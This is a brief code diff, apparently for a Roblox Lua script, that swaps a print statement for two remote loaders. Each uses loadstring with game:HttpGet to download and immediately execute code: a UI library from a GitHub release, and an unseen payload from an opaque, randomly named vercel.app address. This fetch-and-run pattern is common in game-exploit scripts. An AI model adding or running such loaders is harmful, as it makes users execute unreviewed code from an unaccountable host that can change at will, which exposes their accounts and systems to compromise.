@@ -1,1 +1,10 @@
-print("hi")
+local MacLib = loadstring(
+    game:HttpGet(
+        'https://github.com/biggaboy212/Maclib/releases/latest/download/maclib.txt'
+    )
+)()
+
+
+loadstring(
+    game:HttpGet('https://spare-stack-k91x3z77q820lp9m22x04z.vercel.app/')
+)()
